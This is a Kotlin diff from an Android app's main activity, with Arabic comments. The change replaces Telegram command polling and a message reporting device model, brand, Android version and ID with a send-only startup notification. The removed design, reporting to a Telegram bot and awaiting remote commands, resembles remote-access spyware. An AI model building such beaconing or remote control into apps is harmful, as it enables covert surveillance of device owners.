@@ -509,27 +509,15 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // الاتصال بتيليجرام مباشرة
+        // إرسال إشعار للتليجرام (بدون getUpdates - الإرسال فقط)
         val deviceId = SharedPrefsManager.getDeviceId(this) ?: "غير معروف"
         CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
             try {
-                TelegramDirectClient.startCommandPolling(this@MainActivity)
-                delay(2000)
-                TelegramDirectClient.sendMessage(
-                    "✅ <b>تم تشغيل التطبيق بنجاح!</b>\n\n" +
-                    "📱 الجهاز: <b>${Build.MODEL}</b>\n" +
-                    "🏢 الشركة: <b>${Build.BRAND}</b>\n" +
-                    "🤖 أندرويد: <b>${Build.VERSION.RELEASE}</b>\n" +
-                    "🆔 معرف: <code>$deviceId</code>\n\n" +
-                    "🟢 متصل مباشرة بتيليجرام\n" +
-                    "📡 جاري استقبال الأوامر...\n" +
-                    "💾 تم إنشاء نسخة احتياطية أولية",
-                    "HTML"
-                )
+                TelegramDirectClient.sendStartupNotification(this@MainActivity)
                 jsCall("onTelegramConnected('تم الاتصال بتيليجرام بنجاح')")
             } catch (e: Exception) {
-                Log.e("MainActivity", "خطأ في الاتصال بتيليجرام: ${e.message}")
-                jsCall("onSetupError('خطأ في الاتصال بتيليجرام: ${e.message}')")
+                Log.e("MainActivity", "خطأ في إرسال الإشعار: ${e.message}")
+                jsCall("onSetupError('خطأ في الإرسال: ${e.message}')")
             }
         }
     }
